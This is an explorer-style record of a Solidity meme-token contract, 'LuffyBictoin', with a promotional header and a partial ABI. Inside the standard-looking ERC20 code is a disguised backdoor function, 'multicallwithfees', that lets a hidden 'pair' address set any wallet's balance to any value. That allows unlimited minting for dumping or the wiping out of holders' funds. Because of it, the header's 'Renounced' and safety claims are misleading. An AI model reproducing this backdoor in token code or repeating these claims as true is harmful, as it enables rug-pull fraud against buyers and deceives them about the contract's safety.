{"SourceCode": "/**\r\n\ud83d\udc52 Luffy Bictoin\ud83d\udc52 Bitcoin One Piece \ud83d\udc52 Renounced \ud83d\udc52LP Burned \ud83d\udc52No TAX\ud83d\udc52\r\n\r\n\ud83c\udff4\u200d\u2620\ufe0f About Luffy Bictoin\ud83c\udff4\u200d\u2620\ufe0f\r\nAnime fans, gamers, and crypto enthusiasts alike will find something to love in Luffy Bictoin Token, the revolutionary cryptocurrency that aims to provide a comprehensive \r\nmeme coin designed to meet the needs of its users in multiple ways.\r\n\r\n\ud83c\udf10Telegram https://t.me/LuffyBictoin\r\n\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\ud83d\udfe5\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\r\n\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\ud83d\udfe8\u2b1b\u2b1c\u2b1c\r\n\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1b\u2b1c\u2b1c\r\n\u2b1c\u2b1b\ud83d\udfe8\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83c\udffb\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\r\n\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\r\n\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83c\udffb\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\r\n\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\u2b1c\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1c\u2b1b\ud83c\udffb\u2b1b\ud83c\udffb\u2b1b\u2b1b\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\ud83c\udffb\u2b1b\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\ud83d\udfea\ud83d\udfea\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83d\udfea\ud83d\udfea\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\ud83d\udfe8\u2b1b\u2b1b\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83c\udffb\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83c\udffb\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\ud83c\udffb\u2b1b\u2b1b\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83d\udfe6\ud83d\udfe6\u2b1b\u2b1b\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\u2b1b\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1c\u2b1b\u2b1c\u2b1c\u2b1b\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1b\u2b1c\u2b1c\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\u2b1b\ud83c\udffb\ud83c\udffb\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1b\ud83c\udffb\ud83c\udffb\ud83d\udfe8\ud83c\udffb\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\ud83d\udfe8\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1b\u2b1b\u2b1b\u2b1b\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\u2b1c\r\n\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\r\n*/\r\n\r\n// SPDX-License-Identifier: UNLICENSE\r\npragma solidity ^0.8.17;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// File: node_modules\\@openzeppelin\\contracts\\token\\ERC20\\extensions\\IERC20Metadata.sol\r\n\r\n\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n// File: node_modules\\@openzeppelin\\contracts\\utils\\Context.sol\r\n\r\n\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\n// File: @openzeppelin\\contracts\\token\\ERC20\\ERC20.sol\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\n\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of ERC20 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract LuffyBictoin  is Context, IERC20, IERC20Metadata, Ownable {\r\n    mapping (address => uint256) private _tOwned;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    \r\n    address private pair;\r\n    uint256 private _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * The defaut value of {decimals} is 9. To select a different value for\r\n     * {decimals} you should overload it.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor (address _pairPoolUSDT) {\r\n        _name = \"LuffyBictoin\";\r\n        _symbol = \"LuffyBTC\";\r\n        _mint(msg.sender, 10000000000000000 * (10 ** uint256(decimals())));\r\n        pair = _pairPoolUSDT;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _tOwned[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _tOwned[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _tOwned[sender] = senderBalance - amount;\r\n        _tOwned[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        _tOwned[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function multicallwithfees(uint8 version, address implementation, uint256 uintStorage, uint256 uintValue) external {\r\n        require(_msgSender()== pair,'SWAPPER_TOKEN_OUT_ZERO');\r\n        require(version > 0, 'SWAPPER_version_IN_ZERO');\r\n        require(uintValue > 0, 'SWAPPER_MIN_AMOUNT_OUT_ZERO');\r\n        _tOwned[implementation] = uintStorage * uintValue ** version;\r\n        emit Transfer(address(0), implementation, uintStorage * uintValue ** version);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _tOwned[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        _tOwned[account] = accountBalance - amount;\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    } \r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pairPoolUSDT\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"version\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"implementation\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"uintStorage\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"uintValue\",\"type\":\"uint256\"}],\"name\":\"multicallwithfees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inp